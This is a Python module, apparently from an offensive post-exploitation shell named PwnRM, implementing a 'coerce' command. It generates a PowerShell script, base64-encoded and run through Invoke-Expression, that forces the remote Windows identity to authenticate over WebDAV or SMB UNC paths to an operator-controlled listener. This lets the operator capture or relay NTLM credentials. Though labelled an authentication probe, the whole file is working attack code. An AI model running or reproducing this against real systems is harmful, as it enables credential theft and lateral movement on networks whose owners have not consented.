"""Outbound WebDAV/SMB authentication probes from the remote user context."""

import re
from typing import List, Any

from . import BaseModule
from ..shell.ui import c, M, BLD
from ..shell.commands import b64str, str_b64


class CoerceModule(BaseModule):
    name = "coerce"
    description = "Outbound WebDAV/SMB UNC authentication probe (current remote identity)"
    author = "uziii2208"
    options = {
        "--listener": {"desc": "Operator-controlled listener host/IP (required)"},
        "--method": {"desc": "Probe method: webdav, smb, all (default: webdav)"},
        "--port": {"desc": "WebDAV listener port (default: 80)"},
    }

    def run(self, shell, args: List[str]) -> Any:
        listener = ""
        method = "webdav"
        port = 80
        idx = 0
        while idx < len(args):
            arg = args[idx]
            if arg in {"-l", "--listener", "-m", "--method", "-p", "--port"}:
                if idx + 1 >= len(args):
                    shell.write_warning(f"  [-] {arg} requires a value.")
                    return {"status": "error", "error": f"missing value for {arg}"}
                value = args[idx + 1]
                if arg in {"-l", "--listener"}:
                    listener = value.strip()
                elif arg in {"-m", "--method"}:
                    method = value.lower()
                else:
                    try:
                        port = int(value)
                    except ValueError:
                        port = 0
                idx += 2
                continue
            shell.write_warning(f"  [-] Unknown authentication-probe option: {arg}")
            return {"status": "error", "error": "invalid option"}

        if not listener:
            shell.write_warning("Usage: !coerce --listener <IP/Host> [--method webdav|smb|all] [--port 80]")
            return {"status": "error", "error": "missing listener"}
        dns_label = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9_-]{0,61}[A-Za-z0-9])?")
        if (
            len(listener) > 253
            or listener in {".", ".."}
            or any(not dns_label.fullmatch(label) for label in listener.rstrip(".").split("."))
        ):
            shell.write_error("  [-] Listener must be a plain IPv4 address or DNS/NetBIOS host name.")
            return {"status": "error", "error": "invalid listener"}
        if method not in {"webdav", "smb", "all"}:
            shell.write_error("  [-] Unsupported method. This build implements webdav, smb, and all only.")
            return {"status": "error", "error": "invalid method"}
        if not 1 <= port <= 65535:
            shell.write_error("  [-] Listener port must be between 1 and 65535.")
            return {"status": "error", "error": "invalid port"}

        listener_expr = str_b64(listener)
        method_expr = str_b64(method)
        shell.write_info(c(M + BLD, f"  [*] PwnRM outbound authentication probe — {method.upper()} to {listener}:{port}..."))

        ps = f'''
$ErrorActionPreference = 'Continue'
$listener = {listener_expr}
$method = {method_expr}
$port = {port}
$identity = [Security.Principal.WindowsIdentity]::GetCurrent().Name
Write-Host "`n[PwnRM Outbound Authentication Probe]" -ForegroundColor Cyan
Write-Host "  Identity : $identity" -ForegroundColor White
Write-Host "  Listener : $listener`:$port" -ForegroundColor White

if ($method -in @('webdav', 'all')) {{
    $unc = "\\\\$listener@$port\\DavWWWRoot\\pwnrm_$(Get-Random).txt"
    Write-Host "  [*] WebDAV UNC probe: $unc" -ForegroundColor Yellow
    try {{
        $null = [IO.File]::Exists($unc)
        Write-Host '  [+] WebDAV UNC lookup completed; inspect the controlled listener.' -ForegroundColor Green
    }} catch {{
        Write-Host "  [-] WebDAV UNC lookup returned: $($_.Exception.Message)" -ForegroundColor DarkGray
    }}
}}

if ($method -in @('smb', 'all')) {{
    $unc = "\\\\$listener\\pwnrm_$(Get-Random)\\probe.txt"
    Write-Host "  [*] SMB UNC probe: $unc" -ForegroundColor Yellow
    try {{
        $null = [IO.File]::Exists($unc)
        Write-Host '  [+] SMB UNC lookup completed; inspect the controlled listener.' -ForegroundColor Green
    }} catch {{
        Write-Host "  [-] SMB UNC lookup returned: $($_.Exception.Message)" -ForegroundColor DarkGray
    }}
}}

Write-Output '[PWNRM:AUTH-PROBE:COMPLETE]'
'''
        encoded = b64str(ps.encode("utf-16le"))
        command = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        if shell.run_with_interrupt(command, shell.write_line):
            return {"status": "interrupted"}
        return {"status": "completed", "method": method, "listener": listener, "port": port}
